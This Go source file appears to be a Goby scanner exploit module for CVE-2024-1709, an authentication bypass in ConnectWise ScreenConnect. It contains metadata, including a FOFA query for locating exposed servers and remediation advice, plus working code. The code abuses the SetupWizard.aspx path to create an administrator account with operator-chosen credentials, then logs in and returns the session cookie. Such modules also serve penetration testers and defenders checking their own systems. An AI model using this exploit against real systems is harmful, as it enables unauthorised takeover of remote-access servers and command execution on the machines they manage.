package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ConnectWise ScreenConnect Authentication Bypass Vulnerability",
    "Description": "<p>ConnectWise ScreenConnect is a self-hosted remote desktop software application that allows users to self-host and run on their own server, PC, virtual machine or virtual private server.</p><p>There is an authentication vulnerability in products earlier than ScreenConnect 23.9.8. An attacker can register an account and log in to the product backend to perform a series of operations. And commands can be executed through the original functions of ScreenConnect.</p>",
    "Product": "CONNECTWISE-Control-Remote-Support",
    "Homepage": "https://control.connectwise.com/support",
    "DisclosureDate": "2024-02-19",
    "PostTime": "2024-02-22",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "title=\"ScreenConnect Remote Support Software\"  || banner=\"ScreenConnect\" || header=\"ScreenConnect\"",
    "GobyQuery": "title=\"ScreenConnect Remote Support Software\"  || banner=\"ScreenConnect\" || header=\"ScreenConnect\"",
    "Level": "3",
    "Impact": "<p>There is an authentication vulnerability in products earlier than ScreenConnect 23.9.8. An attacker can register an account and log in to the product backend to perform a series of operations. And commands can be executed through the original functions of ScreenConnect.</p>",
    "Recommendation": "<p>The vendor has released a fix for the vulnerability: <a href=\"https://control.connectwise.com/support\">https://control.connectwise.com/support</a></p><p>Temporary fix:</p><p>1. You can configure security protection policies to detect requests for the path segment SetupWizard.aspx.</p><p>2. Set access permissions to intercept sensitive paths, such as Access.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "addUser",
            "show": ""
        },
        {
            "name": "username",
            "type": "input",
            "value": "hellouser",
            "show": "attackType=addUser"
        },
        {
            "name": "password",
            "type": "input",
            "value": "hellopass",
            "show": "attackType=addUser"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2024-1709"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "ConnectWise ScreenConnect 身份验证绕过漏洞（CVE-2024-1709）",
            "Product": "CONNECTWISE-Control-Remote-Support",
            "Description": "<p>ConnectWise ScreenConnect ，是一款自托管的远程桌面软件应用，该款软件允许用户自行托管，可以在自己的服务器、个人电脑、虚拟机或虚拟专用服务器上运行。</p><p>低于 ScreenConnect&nbsp; 23.9.8 版本的产品中，存在身份验证漏洞，攻击者可以注册账户，并登陆到产品后台进行一系列操作。并且可以通过 ScreenConnect 的原有功能进行命令的执行。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序：<a href=\"https://control.connectwise.com/support\">https://control.connectwise.com/support</a></p><p>临时修复方案：</p><p>1. 可以配置安全防护策略，检测对路径段 SetupWizard.aspx 发起的请求。</p><p>2. 设置访问权限对敏感的路径，例如Access等路径进行拦截。</p>",
            "Impact": "<p>低于 ScreenConnect&nbsp; 23.9.8 版本的产品中，存在身份验证漏洞，攻击者可以注册账户，并登陆到产品后台进行一系列操作。并且可以通过 ScreenConnect 的原有功能进行命令的执行。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "ConnectWise ScreenConnect Authentication Bypass Vulnerability",
            "Product": "CONNECTWISE-Control-Remote-Support",
            "Description": "<p>ConnectWise ScreenConnect is a self-hosted remote desktop software application that allows users to self-host and run on their own server, PC, virtual machine or virtual private server.</p><p>There is an authentication vulnerability in products earlier than ScreenConnect 23.9.8. An attacker can register an account and log in to the product backend to perform a series of operations. And commands can be executed through the original functions of ScreenConnect.</p>",
            "Recommendation": "<p>The vendor has released a fix for the vulnerability: <a href=\"https://control.connectwise.com/support\">https://control.connectwise.com/support</a></p><p>Temporary fix:</p><p>1. You can configure security protection policies to detect requests for the path segment SetupWizard.aspx.</p><p>2. Set access permissions to intercept sensitive paths, such as Access.</p>",
            "Impact": "<p>There is an authentication vulnerability in products earlier than ScreenConnect 23.9.8. An attacker can register an account and log in to the product backend to perform a series of operations. And commands can be executed through the original functions of ScreenConnect.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10925"
}`

	getViewValueY93vGvRhF9 := func(hostInfo *httpclient.FixUrl) (string, string, error) {
		initiaRequest := httpclient.NewGetRequestConfig("//SetupWizard.aspx/")
		initiaRequest.VerifyTls = false
		initiaRequest.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, initiaRequest)
		if err != nil {
			return "", "", err
		} else if resp != nil && resp.StatusCode == 200 && len(regexp.MustCompile(`value="([^"]+)"`).FindStringSubmatch(resp.RawBody)) > 1 && len(regexp.MustCompile(`VIEWSTATEGENERATOR" value="([^"]+)"`).FindStringSubmatch(resp.RawBody)) > 1 {
			viewstate := regexp.MustCompile(`value="([^"]+)"`).FindStringSubmatch(resp.RawBody)[1]
			viewgen := regexp.MustCompile(`VIEWSTATEGENERATOR" value="([^"]+)"`).FindStringSubmatch(resp.RawBody)[1]
			return viewstate, viewgen, nil
		}
		return "", "", errors.New("漏洞利用失败")
	}
	getNewViewVauleY93vGvRhF9 := func(hostInfo *httpclient.FixUrl) (string, string, error) {
		viewstate, viewgen, err := getViewValueY93vGvRhF9(hostInfo)
		if err != nil {
			return "", "", err
		}
		newRequest := httpclient.NewPostRequestConfig("//SetupWizard.aspx/")
		newRequest.VerifyTls = false
		newRequest.FollowRedirect = false
		newRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		newRequest.Data = `__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=` + url.QueryEscape(viewstate) + `&__VIEWSTATEGENERATOR=` + url.QueryEscape(viewgen) + `&ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton=Next`
		resp, err := httpclient.DoHttpRequest(hostInfo, newRequest)
		if err != nil {
			return "", "", err
		} else if resp != nil && resp.StatusCode == 200 && len(regexp.MustCompile(`value="([^"]+)"`).FindStringSubmatch(resp.RawBody)) > 1 && len(regexp.MustCompile(`VIEWSTATEGENERATOR" value="([^"]+)"`).FindStringSubmatch(resp.RawBody)) > 1 {
			newViewstate := regexp.MustCompile(`value="([^"]+)"`).FindStringSubmatch(resp.RawBody)[1]
			newViewgen := regexp.MustCompile(`VIEWSTATEGENERATOR" value="([^"]+)"`).FindStringSubmatch(resp.RawBody)[1]
			return newViewstate, newViewgen, nil
		}
		return "", "", errors.New("漏洞利用失败")
	}
	addUserY93vGvRhF9 := func(hostInfo *httpclient.FixUrl, username, email, password string) (*httpclient.HttpResponse, error) {
		newViewstate, newViewgen, err := getNewViewVauleY93vGvRhF9(hostInfo)
		if err != nil {
			return nil, err
		}
		addUserConfig := httpclient.NewPostRequestConfig("//SetupWizard.aspx/")
		addUserConfig.VerifyTls = false
		addUserConfig.FollowRedirect = false
		addUserConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		addUserConfig.Data = `__LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=` + url.QueryEscape(newViewstate) + `&__VIEWSTATEGENERATOR=` + url.QueryEscape(newViewgen) + `&ctl00$Main$wizard$userNameBox=` + username + `&ctl00$Main$wizard$emailBox=` + email + `&ctl00$Main$wizard$passwordBox=` + password + `&ctl00$Main$wizard$verifyPasswordBox=` + password + `&ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton=Next`
		return httpclient.DoHttpRequest(hostInfo, addUserConfig)
	}

	verifyY93vGvRhF9 := func(hostInfo *httpclient.FixUrl, username, password string) (*httpclient.HttpResponse, error) {
		//获取token
		tokenConfig := httpclient.NewGetRequestConfig("/Login?Reason=0")
		tokenConfig.VerifyTls = false
		tokenConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, tokenConfig); resp != nil && resp.StatusCode == 200 && len(regexp.MustCompile(`"antiForgeryToken":"(.*?)"`).FindStringSubmatch(resp.RawBody)) > 1 {
			token := regexp.MustCompile(`"antiForgeryToken":"(.*?)"`).FindStringSubmatch(resp.RawBody)[1]
			// 登录验证
			loginConfig := httpclient.NewPostRequestConfig("/Services/AuthenticationService.ashx/TryLogin")
			loginConfig.VerifyTls = false
			loginConfig.FollowRedirect = false
			loginConfig.Header.Store("X-Anti-Forgery-Token", token)
			loginConfig.Header.Store("Content-Type", "application/json")
			loginConfig.Data = `["` + username + `","` + password + `",null,null,"PjaItkAJ24I2vOp8"]`
			return httpclient.DoHttpRequest(hostInfo, loginConfig)
		} else if err != nil {
			return nil, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := addUserY93vGvRhF9(hostInfo, "hello", "", "hello")
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, ".errormessage = ") && strings.Contains(resp.RawBody, `.isvalid = "False"`)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			username := goutils.B2S(stepLogs.Params["username"])
			password := goutils.B2S(stepLogs.Params["password"])
			if attackType == "addUser" {
				if resp, err := addUserY93vGvRhF9(expResult.HostInfo, username, goutils.RandomHexString(10)+`@`+goutils.RandomHexString(5)+`.com`, password); resp != nil && resp.StatusCode == 200 && !strings.Contains(resp.RawBody, `".errormessage = "`) && !strings.Contains(resp.RawBody, `.isvalid = "False"`) {
					if resp, err := verifyY93vGvRhF9(expResult.HostInfo, username, password); resp != nil && resp.StatusCode == 200 && resp.HeaderString != nil && strings.Contains(resp.HeaderString.String(), `.ASPXAUTH=`) && strings.TrimSpace(resp.RawBody) == "1" {
						expResult.Success = true
						expResult.Output = "Username: " + username + "\nPassword: " + password + "\nCookie: " + resp.Cookie
					} else if err != nil {
						expResult.Output = err.Error()
					} else {
						expResult.Output = `漏洞利用失败`
					}
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
